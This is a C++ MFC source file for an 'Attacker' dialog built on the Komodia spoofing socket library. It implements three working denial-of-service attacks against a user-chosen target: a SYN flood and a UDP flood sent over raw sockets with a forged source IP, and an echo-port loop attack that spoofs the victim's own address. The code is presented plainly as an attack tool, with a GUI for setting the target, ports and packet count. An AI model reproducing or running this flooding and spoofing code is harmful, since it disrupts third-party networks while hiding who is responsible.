// AttackerDlg.cpp : implementation file
//
/*
 *
 *
 *  Copyright (c) 2000 Barak Weichselbaum <barak@komodia.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *
 * Contact info:
 * Site: http://www.komodia.com
 * Email: barak@komodia.com
 */

#include "stdafx.h"
#include "Attacker.h"
#include "AttackerDlg.h"

#include "..\SpoofSocket.h"
#include "..\UDPSocket.h"
#include "..\TCPSocket.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAttackerDlg dialog

CAttackerDlg::CAttackerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CAttackerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CAttackerDlg)
	m_Packets = 0;
	m_SourcePort = 0;
	m_DestinationPort = 0;
	m_AttackType = -1;
	m_TcpOptions = FALSE;
	m_IPOptions = FALSE;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CAttackerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAttackerDlg)
	DDX_Control(pDX, IDC_SOURCEIP, m_SourceIP);
	DDX_Control(pDX, IDC_DESTINATIONIP, m_DestinationIP);
	DDX_Text(pDX, IDC_PACKETS, m_Packets);
	DDV_MinMaxInt(pDX, m_Packets, 1, 65000);
	DDX_Text(pDX, IDC_SOURCEPORT, m_SourcePort);
	DDX_Text(pDX, IDC_DESTINATIONPORT, m_DestinationPort);
	DDX_Radio(pDX, IDC_SYNATTACK, m_AttackType);
	DDX_Check(pDX, IDC_TCPOPTIONS, m_TcpOptions);
	DDX_Check(pDX, IDC_IPOPTIONS, m_IPOptions);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAttackerDlg, CDialog)
	//{{AFX_MSG_MAP(CAttackerDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_SEND, OnSend)
	ON_BN_CLICKED(IDQuit, OnQuit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAttackerDlg message handlers

BOOL CAttackerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CAttackerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CAttackerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CAttackerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CAttackerDlg::OnSend() 
{
	//Invalidate (get all data)
	if (UpdateData(TRUE))
	{
		//Attack
		switch(m_AttackType)
		{
			case ATTACK_SYN:
				SynFlood();
				break;
			case ATTACK_ECHO:
				EchoAttack();
				break;
			case ATTACK_UDP:
				UDPFlood();
				break;
		}
	}

}

void CAttackerDlg::OnQuit() 
{
	//quit
	EndDialog(0);
}

void CAttackerDlg::SynFlood()
{
	//Create the tcp socket
	CTCPSocket* tcp;
	tcp=new CTCPSocket();

	//Was an error
	BOOL bError=TRUE;

	tcp->SetRaw(TRUE);

	if (tcp->Create())
	{
		bError=FALSE;
		//Set the source IP
		char* cSourceIP;
		cSourceIP=IPCtrlToSTR(&m_SourceIP);

		if (!cSourceIP)
			//Error
			AfxMessageBox(ERROR_INVALID_SOURCE);
		else
		{
			//Copy source IP
			cSourceIP=_strdup(cSourceIP);

			char* cDestinationIP;
			cDestinationIP=IPCtrlToSTR(&m_DestinationIP);

			if (!cDestinationIP)
			{
				delete cSourceIP;
				//Error
				AfxMessageBox(ERROR_INVALID_DESTINATION);
			}
			else
			{
				bError=TRUE;

				//Let's attack
				tcp->SetSourceAddress(cSourceIP);
				tcp->Bind(cSourceIP);

				if (m_IPOptions)
					SetIPOptions(tcp);

				//Check if allowing TCP options
				if (m_TcpOptions)
				{
					tcp->SetTCPOptions(TRUE);
					tcp->GetTCPOptions()->AddOption_Nothing();
					tcp->GetTCPOptions()->AddOption_ENDLIST();
				}

				for (int iCount=1;iCount<=m_Packets;iCount++)
					if (tcp->Connect(m_SourcePort,cDestinationIP,m_DestinationPort))
						//OK
						bError=FALSE;

				delete cSourceIP;
			}
		}
	}

	if (bError)
		//Display error
		DisplaySocketError(tcp);

	tcp->Close();
	delete tcp;
}

void CAttackerDlg::DisplaySocketError(CSpoofSocket *sock)
{
	//Display an error
	char* cErr;
	cErr=new char[10];
	itoa(sock->GetLastError(),cErr,10);

	char* cMsg;
	cMsg=new char[40];
	strcpy(cMsg,"Winsock error : ");
	strcat(cMsg,cErr);

	AfxMessageBox(cMsg);

	delete cMsg;
	delete cErr;
}

LPSTR CAttackerDlg::IPCtrlToSTR(CIPAddressCtrl* ctrl)
{
	//Converts the control address to textual address
	//Convert bytes to string
	BYTE bOctet1;
	BYTE bOctet2;
	BYTE bOctet3;
	BYTE bOctet4;

	//Get the value and blank values
	int iBlank;
	iBlank=ctrl->GetAddress(bOctet1,bOctet2,bOctet3,bOctet4);

	if (iBlank!=4)
		//Not filled
		return NULL;
	else
	{
		in_addr iAddr;
		iAddr.S_un.S_un_b.s_b1=bOctet1;
		iAddr.S_un.S_un_b.s_b2=bOctet2;
		iAddr.S_un.S_un_b.s_b3=bOctet3;
		iAddr.S_un.S_un_b.s_b4=bOctet4;

		return inet_ntoa(iAddr);
	}
}

void CAttackerDlg::UDPFlood()
{
	//Create the udp socket
	CUDPSocket* udp;
	udp=new CUDPSocket();

	udp->SetRaw(TRUE);

	//Was an error
	BOOL bError=TRUE;

	if (udp->Create())
	{
		bError=FALSE;

		//Set the source IP
		char* cSourceIP;
		cSourceIP=IPCtrlToSTR(&m_SourceIP);

		if (!cSourceIP)
			//Error
			AfxMessageBox(ERROR_INVALID_SOURCE);
		else
		{
			//Copy source IP
			cSourceIP=_strdup(cSourceIP);

			char* cDestinationIP;
			cDestinationIP=IPCtrlToSTR(&m_DestinationIP);

			if (!cDestinationIP)
			{
				delete cSourceIP;
				//Error
				AfxMessageBox(ERROR_INVALID_DESTINATION);
			}
			else
			{
				bError=TRUE;

				if (m_IPOptions)
					SetIPOptions(udp);

				//Let's attack
				udp->SetSourceAddress(cSourceIP);

				//Flood text
				char cFlood[]="TCP/IP library flooding!!!";

				for (int iCount=1;iCount<=m_Packets;iCount++)
					if (udp->Send(m_SourcePort,cDestinationIP,m_DestinationPort,cFlood,strlen(cFlood)+1))
						//OK
						bError=FALSE;

				delete cSourceIP;
			}
		}
	}

	if (bError)
		//Display error
		DisplaySocketError(udp);

	udp->Close();
	delete udp;
}

void CAttackerDlg::EchoAttack()
{
		//Create the udp socket
	CUDPSocket* udp;
	udp=new CUDPSocket();

	udp->SetRaw(TRUE);

	//Was an error
	BOOL bError=TRUE;

	if (udp->Create())
	{
		bError=FALSE;

		char* cDestinationIP;
		cDestinationIP=IPCtrlToSTR(&m_DestinationIP);

		if (!cDestinationIP)
			//Error
			AfxMessageBox(ERROR_INVALID_DESTINATION);
		else
		{
			bError=TRUE;

			if (m_IPOptions)
				SetIPOptions(udp);

			//Let's attack
			udp->SetSourceAddress(cDestinationIP);

			char msg[10]="Die echo";

			for (int iCount=1;iCount<=m_Packets;iCount++)
				if (udp->Send(7,cDestinationIP,7,msg,strlen(msg)))
					//OK
					bError=FALSE;

		}
		
	}

	if (bError)
		//Display error
		DisplaySocketError(udp);

	udp->Close();
	delete udp;
}

void CAttackerDlg::SetIPOptions(CSpoofSocket *sok)
{
	//Add options
	sok->SetOptions(TRUE);
	sok->GetOptions()->AddOption_Security(IPOption_SECURITY_TOPSECRET);
	sok->GetOptions()->AddOption_Stream(1);

	tRouting rRT;
	rRT.iRoutes=1;
	rRT.ulRoutes[0]=inet_addr("127.0.0.1");

	sok->GetOptions()->AddOption_LooseRoute(rRT);
	sok->GetOptions()->AddOption_RecordRoute(1);
	sok->GetOptions()->AddOption_ENDLIST();
}
